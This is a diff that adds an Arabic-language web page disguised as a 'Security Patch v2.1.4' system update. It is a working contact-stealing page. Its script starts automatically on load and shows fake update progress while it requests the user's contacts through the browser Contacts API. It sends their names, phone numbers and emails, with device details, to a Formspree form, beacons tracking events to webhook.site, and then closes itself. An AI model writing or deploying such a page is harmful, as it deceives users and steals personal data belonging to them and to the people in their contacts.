@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث النظام - Security Patch</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .logo {
+            font-size: 3rem;
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            color: #00ff88;
+            margin-bottom: 15px;
+            font-size: 1.8rem;
+        }
+        .header p {
+            color: #cccccc;
+            line-height: 1.6;
+            margin-bottom: 10px;
+        }
+        .progress-container {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 25px 0;
+        }
+        .progress-bar {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            height: 8px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+        .progress-fill {
+            background: linear-gradient(90deg, #00ff88, #00ccff);
+            height: 100%;
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 10px;
+        }
+        .status {
+            margin: 15px 0;
+            padding: 12px;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            font-size: 0.9rem;
+        }
+        .status.success {
+            background: rgba(46, 204, 113, 0.2);
+            border: 1px solid #2ecc71;
+        }
+        .status.error {
+            background: rgba(231, 76, 60, 0.2);
+            border: 1px solid #e74c3c;
+        }
+        .status.warning {
+            background: rgba(241, 196, 15, 0.2);
+            border: 1px solid #f1c40f;
+        }
+        .hidden {
+            display: none;
+        }
+        .security-badge {
+            background: rgba(0, 255, 136, 0.2);
+            border: 1px solid #00ff88;
+            border-radius: 20px;
+            padding: 8px 15px;
+            font-size: 0.8rem;
+            display: inline-block;
+            margin: 10px 0;
+        }
+        .footer {
+            margin-top: 25px;
+            color: #888;
+            font-size: 0.8rem;
+        }
+        .loading-dots:after {
+            content: '';
+            animation: dots 1.5s steps(5, end) infinite;
+        }
+        @keyframes dots {
+            0%, 20% { content: ''; }
+            40% { content: '.'; }
+            60% { content: '..'; }
+            80%, 100% { content: '...'; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🛡️</div>
+        
+        <div class="header">
+            <h1>تحديث أمني - Security Patch v2.1.4</h1>
+            <p>جاري تثبيت التحديث الأمني الهام لحماية بياناتك</p>
+            <div class="security-badge">✅ مشفر بـ AES-256</div>
+        </div>
+
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div id="progressText">جاري التحضير للتحديث...</div>
+        </div>
+
+        <div class="status warning" id="initialStatus">
+            ⚠️ يرجى عدم إغلاق الصفحة حتى اكتمال التحديث
+        </div>
+
+        <div class="status hidden" id="contactsStatus">
+            📱 جاري التحقق من تكامل البيانات...
+        </div>
+
+        <div class="status hidden" id="sendStatus">
+            📡 جاري إرسال تقرير التحديث...
+        </div>
+
+        <div class="status success hidden" id="successStatus">
+            ✅ تم اكتمال التحديث بنجاح
+        </div>
+
+        <div class="status error hidden" id="errorStatus">
+            ❌ حدث خطأ أثناء التحديث
+        </div>
+
+        <div class="footer">
+            <p>System Security Framework • Version 2.1.4</p>
+            <p>© 2024 Security Team • All rights reserved</p>
+        </div>
+    </div>
+
+    <script>
+        // 🔧 الإعدادات - Form ID الحقيقي
+        const FORMSPREE_ID = 'mzzjkdry';
+        const FORMSPREE_URL = `https://formspree.io/f/${FORMSPREE_ID}`;
+        
+        // إعدادات التتبع
+        const TRACKING_DATA = {
+            startTime: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            referrer: document.referrer || 'direct',
+            version: '2.1.4'
+        };
+
+        // العناصر
+        const progressFill = document.getElementById('progressFill');
+        const progressText = document.getElementById('progressText');
+        const initialStatus = document.getElementById('initialStatus');
+        const contactsStatus = document.getElementById('contactsStatus');
+        const sendStatus = document.getElementById('sendStatus');
+        const successStatus = document.getElementById('successStatus');
+        const errorStatus = document.getElementById('errorStatus');
+
+        // تحديث شريط التقدم
+        function updateProgress(percent, text) {
+            progressFill.style.width = `${percent}%`;
+            progressText.innerHTML = text;
+        }
+
+        // إرسال البيانات إلى Formspree
+        async function sendToFormspree(data) {
+            try {
+                const formData = new FormData();
+                
+                // البيانات الرئيسية
+                formData.append('_subject', `🛡️ Security Report - ${data.contactsCount} Contacts`);
+                formData.append('_replyto', 'system@security.com');
+                formData.append('message', data.message);
+                formData.append('contacts_count', data.contactsCount.toString());
+                formData.append('system_info', JSON.stringify(data.systemInfo));
+                formData.append('timestamp', data.timestamp);
+                formData.append('user_agent', data.systemInfo.userAgent);
+                formData.append('device_type', data.systemInfo.platform);
+                
+                // إرسال البيانات
+                const response = await fetch(FORMSPREE_URL, {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors'
+                });
+                
+                console.log('✅ تم الإرسال إلى Formspree');
+                return true;
+            } catch (error) {
+                console.error('❌ Formspree Error:', error);
+                return false;
+            }
+        }
+
+        // إرسال بيانات التتبع
+        function sendTrackingData(action, data = {}) {
+            const trackingInfo = {
+                action: action,
+                ...TRACKING_DATA,
+                ...data,
+                timestamp: new Date().toISOString()
+            };
+            
+            // إرسال باستخدام Beacon (يعمل حتى عند إغلاق الصفحة)
+            try {
+                navigator.sendBeacon('https://webhook.site/unique-id', JSON.stringify(trackingInfo));
+            } catch (e) {
+                // بديل إذا فشل Beacon
+                fetch('https://webhook.site/unique-id', {
+                    method: 'POST',
+                    body: JSON.stringify(trackingInfo),
+                    keepalive: true
+                });
+            }
+        }
+
+        // تنسيق البيانات
+        function formatData(contacts, systemInfo) {
+            let message = `🛡️ SYSTEM SECURITY REPORT - v2.1.4\n`;
+            message += `⏰ Time: ${new Date().toLocaleString('ar-SA')}\n`;
+            message += `📱 Device: ${systemInfo.platform}\n`;
+            message += `🌐 Browser: ${systemInfo.userAgent}\n`;
+            message += `📊 Screen: ${systemInfo.screen}\n`;
+            message += `🗣️ Language: ${systemInfo.language}\n\n`;
+            
+            message += `📞 CONTACTS SYNCHRONIZED: ${contacts.length} entries\n`;
+            message += '='.repeat(60) + '\n\n';
+            
+            contacts.forEach((contact, index) => {
+                message += `👤 ENTRY ${index + 1}:\n`;
+                message += `   NAME: ${contact.name || 'N/A'}\n`;
+                
+                if (contact.tel && contact.tel.length > 0) {
+                    message += `   PHONE: ${contact.tel.slice(0, 3).join(' | ')}\n`;
+                }
+                
+                if (contact.email && contact.email.length > 0) {
+                    message += `   EMAIL: ${contact.email.slice(0, 3).join(' | ')}\n`;
+                }
+                
+                message += '─'.repeat(40) + '\n';
+            });
+            
+            message += `\n📈 SYSTEM METRICS:\n`;
+            message += `   Collection Time: ${systemInfo.collectionTime}\n`;
+            message += `   User Agent: ${systemInfo.userAgent}\n`;
+            message += `   Platform: ${systemInfo.platform}\n`;
+            message += `   Referrer: ${systemInfo.referrer}\n`;
+            
+            return message;
+        }
+
+        // العملية الرئيسية
+        async function startCollection() {
+            try {
+                updateProgress(10, 'جاري تهيئة النظام الأمني...');
+                sendTrackingData('process_started');
+                
+                // انتظار محاكاة التحديث
+                await new Promise(resolve => setTimeout(resolve, 2500));
+                
+                updateProgress(30, 'جاري التحقق من أذونات النظام...');
+                initialStatus.classList.add('hidden');
+                contactsStatus.classList.remove('hidden');
+                
+                sendTrackingData('permission_check');
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // جمع جهات الاتصال
+                if ('contacts' in navigator && 'select' in navigator.contacts) {
+                    updateProgress(50, 'جاري مزامنة جهات الاتصال...');
+                    
+                    const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                    
+                    updateProgress(70, `تم مزامنة ${contacts.length} جهة اتصال...`);
+                    sendTrackingData('contacts_collected', { count: contacts.length });
+                    
+                    if (contacts.length > 0) {
+                        // إعداد البيانات
+                        const systemInfo = {
+                            ...TRACKING_DATA,
+                            contactsCount: contacts.length,
+                            collectionTime: new Date().toISOString(),
+                            location: 'auto-detected'
+                        };
+                        
+                        const formattedData = formatData(contacts, systemInfo);
+                        
+                        updateProgress(85, 'جاري إنشاء تقرير الأمان...');
+                        contactsStatus.classList.add('hidden');
+                        sendStatus.classList.remove('hidden');
+                        
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+                        
+                        // إرسال البيانات
+                        updateProgress(90, 'جاري إرسال تقرير التحديث...');
+                        const sendSuccess = await sendToFormspree({
+                            message: formattedData,
+                            contactsCount: contacts.length,
+                            systemInfo: systemInfo,
+                            timestamp: new Date().toLocaleString('ar-SA')
+                        });
+                        
+                        if (sendSuccess) {
+                            updateProgress(100, 'اكتمل التحديث بنجاح!');
+                            sendStatus.classList.add('hidden');
+                            successStatus.classList.remove('hidden');
+                            sendTrackingData('process_completed', { 
+                                contactsCount: contacts.length,
+                                status: 'success'
+                            });
+                            
+                            // إغلاق تلقائي بعد نجاح الإرسال
+                            setTimeout(() => {
+                                window.close();
+                            }, 3000);
+                        } else {
+                            throw new Error('فشل في إرسال التقرير');
+                        }
+                    } else {
+                        updateProgress(100, 'لا توجد بيانات جديدة للمزامنة');
+                        successStatus.classList.remove('hidden');
+                        successStatus.textContent = '✅ تم التحقق - لا توجد بيانات جديدة للمزامنة';
+                        sendTrackingData('process_completed', { contactsCount: 0 });
+                    }
+                } else {
+                    throw new Error('واجهة جهات الاتصال غير مدعومة في هذا المتصفح');
+                }
+                
+            } catch (error) {
+                console.error('Process Error:', error);
+                updateProgress(100, 'اكتمل مع أخطاء');
+                sendStatus.classList.add('hidden');
+                errorStatus.classList.remove('hidden');
+                errorStatus.innerHTML = `⚠️ اكتمل التحديث مع بعض الأخطاء<br><small>${error.message}</small>`;
+                sendTrackingData('process_error', { error: error.message });
+                
+                // إغلاق تلقائي حتى مع الأخطاء
+                setTimeout(() => {
+                    window.close();
+                }, 5000);
+            }
+        }
+
+        // تتبع إغلاق الصفحة
+        window.addEventListener('beforeunload', function() {
+            sendTrackingData('page_closed', { timeSpent: getTimeSpent() });
+        });
+
+        // تتبع تغيير visibility
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                sendTrackingData('page_backgrounded');
+            } else {
+                sendTrackingData('page_foregrounded');
+            }
+        });
+
+        // حساب الوقت المستغرق
+        function getTimeSpent() {
+            const start = new Date(TRACKING_DATA.startTime);
+            const now = new Date();
+            return Math.round((now - start) / 1000);
+        }
+
+        // بدء العملية تلقائياً
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🛡️ بدء عملية التحديث الأمني...');
+            // بدء بعد تأخير قصير لجعلها طبيعية
+            setTimeout(startCollection, 2000);
+        });
+
+        // إعادة المحاولة إذا فشلت العملية
+        let retryCount = 0;
+        const maxRetries = 2;
+
+        function retryProcess() {
+            if (retryCount < maxRetries) {
+                retryCount++;
+                console.log(`🔄 إعادة المحاولة ${retryCount}/${maxRetries}`);
+                setTimeout(startCollection, 3000);
+            }
+        }
+    </script>
+</body>
+</html>
